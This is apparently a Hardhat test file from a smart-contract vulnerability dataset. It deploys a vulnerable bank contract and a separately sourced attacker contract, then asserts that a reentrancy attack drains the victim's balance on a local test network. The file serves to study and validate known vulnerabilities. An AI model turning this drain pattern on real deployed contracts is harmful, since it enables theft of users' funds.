const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol", function () {
  let U_BANK;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    const logPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol/Log.json",
    );
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy U_BANK contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol/U_BANK.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    U_BANK = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await U_BANK.deploy(log.target);
    await victim.waitForDeployment();

    // Deploy MaliciousContract with U_BANK address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("functional check: reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol", async function () {
    const [v, a] = await ethers.getSigners();
    const amount = ethers.parseEther("10");
    //Verify Put on original contract works as expected
    await expect(victim.connect(a).Put(0, { value: amount })).to.not.be
      .reverted;
    //oracle: victim contract should have the amount deposited
    expect(await ethers.provider.getBalance(victim.target)).to.equal(amount);

    const balanceBefore = await ethers.provider.getBalance(a.address);

    //Verify Collect on original contract works as expected 
    const tx = await victim.connect(a).Collect(amount);
    const receipt = await tx.wait();
    const gasFee = receipt.gasUsed * receipt.gasPrice;
    //oracle: victim contract should have 0 balance
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
    //oracle: account a should have the balance before the transaction minus the gas fee
    expect(await ethers.provider.getBalance(a.address)).to.equal(
      balanceBefore + amount - gasFee,
    );
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Put(1, { value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({ value: ethers.parseEther("5") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10"));

    //set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    // for this particular contract the MinSum is 2.
    // If hacker uses an odd number will miss 1 eth
    await hacker.attack(ethers.parseEther("2"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(
      hacker.target,
    );

    // Verify the attack was successful

    expect(victimBalance).to.be.below(ethers.parseEther("5"));

    // hacker has more than the deposited amount
    expect(maliciousContractBalance).to.be.above(ethers.parseEther("5"));
  });
});
